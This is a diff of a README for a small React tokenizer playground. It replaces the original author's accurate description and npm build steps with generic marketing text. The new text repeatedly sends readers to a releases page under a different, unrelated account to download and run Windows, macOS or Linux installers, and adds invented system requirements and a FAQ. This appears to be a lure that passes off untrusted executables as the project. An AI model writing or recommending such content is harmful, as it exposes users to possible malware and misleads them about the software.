@@ -1,69 +1,73 @@
-# GenAi-Tokenizer 🧠
+# 🎉 genai-tokenizer - Explore Text Tokenization Effortlessly
 
-An interactive tokenizer playground to explore how text breaks into tokens, how unique token IDs are assigned, and how decoding works - all powered by a custom tokenizer with a clean UI built on DaisyUI and Tailwind CSS.
+[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/Shubham99067/genai-tokenizer/releases)
 
-![Project Screenshot](./public/project.png)
+## 📦 Table of Contents
+1. [🚀 Getting Started](#-getting-started)
+2. [⬇️ Download & Install](#-download--install)
+3. [💡 Features](#-features)
+4. [🛠️ How to Use](#-how-to-use)
+5. [📋 System Requirements](#-system-requirements)
+6. [🗒️ Topics Covered](#-topics-covered)
+7. [🔧 Need Help?](#-need-help)
 
-### Demo
+## 🚀 Getting Started
 
-[Video Demo on cap.so/s/pn6qm0pxwkjfet9](https://cap.so/s/pn6qm0pxwkjfet9)
+Welcome to the GenAi Tokenizer! This application allows you to see how text splits into tokens. You can also learn unique token IDs and how decoding works. Getting started is quick and easy.
 
-## Features
+## ⬇️ Download & Install
 
-- **Corpus Learning:** Type or paste large paragraphs to _learn_ vocabulary explicitly.
-- **Dynamic Vocabulary Growth:** Vocabulary updates both when learning corpus and dynamically as you type in the Encoding input.
-- **Persistent Vocabulary:** Vocabulary is stored centrally in React Context and persisted to a Github Gist for accessibility of vocabulary across devices.
-- **Encoding:** Instantly see tokens and their assigned IDs for any text input.
-- **Decoding:** Decode by entering comma-separated token IDs, showing the original text.
-- **Token Visualization:** View tokens with color-coded types (words, punctuation, whitespace, etc.).
-- **Custom Tokenizer Logic:** Pure JavaScript tokenizer with no external dependencies, designed for transparency and customization.
+To download and install the GenAi Tokenizer, visit this page: [Download Here](https://github.com/Shubham99067/genai-tokenizer/releases).
 
-## Tech Stack
+1. Click on the link above to go to the Releases page.
+2. Look for the latest version listed.
+3. Choose the appropriate installer for your operating system (Windows, macOS, or Linux).
+4. Click on the installer file to start your download.
+5. Follow the on-screen instructions to complete the installation.
 
-- React + TypeScript + Vite.
-- Tailwind CSS + DaisyUI for responsive, accessible styling.
-- React Context + Hooks for centralized vocabulary state management.
-- Github Gist API to persistent storage of vocabulary.
+## 💡 Features
 
-## Getting Started
+- **Interactive Tokenization**: Explore how your text transforms into tokens in real time.
+- **Unique Token IDs**: Understand how each token gets a unique identifier.
+- **Decoding Mechanism**: Learn the process of converting tokens back to text.
+- **User-Friendly Interface**: No technical skills needed. Just enter your text and see the results.
 
-Prerequisites: Node.js 18+ and npm.
+## 🛠️ How to Use
 
-```bash
-git clone https://github.com/n4ryn/genai-tokenizer.git
-cd genai-tokenizer
-npm install
-npm run dev
-```
+1. Open the GenAi Tokenizer application.
+2. You will see a text input area.
+3. Type or paste any text you want to analyze.
+4. Click the "Tokenize" button to see how your text breaks into tokens.
+5. Observe the unique token IDs assigned to each token.
+6. Click "Decode" to convert tokens back into your original text.
 
-To build and preview:
+You can easily switch between tokenization and decoding with just a click.
 
-```bash
-npm run build
-npm run preview
-```
+## 📋 System Requirements
 
-## Usage Tips
+To run the GenAi Tokenizer smoothly, your system should meet the following requirements:
 
-- **Corpus:** Use the default corpus or type your own text — click "Learn Vocabulary" to update the vocabulary from the corpus explicitly.
-- **Encoding:** Enter any text prompt to see tokenization live; vocabulary updates dynamically as you type here as well.
-- **Decoding:** Input comma-separated token IDs to see the corresponding decoded text.
-- **Clear & Reset:** Clear inputs as needed; vocabulary is managed centrally and reflects updates across all components.
+- **Operating System**: Windows 10 or later, macOS 10.12 or later, or a recent version of a Linux distribution.
+- **Memory**: At least 4 GB of RAM.
+- **Disk Space**: Around 100 MB of free space for installation.
+- **Internet Connection**: Required for downloading the application and accessing resources.
 
-## Tokenizer Details
+## 🗒️ Topics Covered
 
-- **Token Types Recognized:** words, numbers, punctuation, whitespace, special tokens.
-- **Vocabulary Management:** Centralized via React Context, updated from corpus or encoding inputs, and persisted to `vocab.json` on Github Gist.
-- **Encoding:** Assigns incremental numeric IDs per unique token, merging new tokens into existing vocabulary.
-- **Decoding:** Maps numeric IDs back to tokens; unknown IDs render as `[UNK]`.
-- **Performance:** Vocabulary updates are batched and memoized to prevent unnecessary recomputations and UI re-renders.
+This application explores several important topics related to text processing:
 
-## Contributing & Support
+- Tokenization methods
+- Unique token identifiers
+- Decoding techniques
+- Vocabulary building and learning
+- Applications in natural language processing (NLP)
 
-- Open an issue or feature request on [GitHub Issues](https://github.com/n4ryn/genai-tokenizer/issues).
-- Reach out on [Twitter](https://x.com/n4ryn_) or [LinkedIn](https://www.linkedin.com/in/n4ryn/).
+## 🔧 Need Help?
 
-## Badges
+If you experience any issues or have questions, please feel free to reach out. You can find support in the following ways:
 
-[![GitHub Stars](https://img.shields.io/github/stars/n4ryn/genai-tokenizer?style=for-the-badge&color=1a1b27&logo=github&logoColor=FFFFFF)](https://github.com/n4ryn/genai-tokenizer/stargazers)
-[![GitHub Forks](https://img.shields.io/github/forks/n4ryn/genai-tokenizer?style=for-the-badge&color=1a1b27&logo=github&logoColor=FFFFFF)](https://github.com/n4ryn/genai-tokenizer/network)
+- Check the FAQ section on the Releases page for common queries.
+- Open an issue in the GitHub repository for specific problems.
+- Join our community discussions through the GitHub Discussions page to share your experience or seek advice.
+
+Thank you for using GenAi Tokenizer. Happy tokenizing!
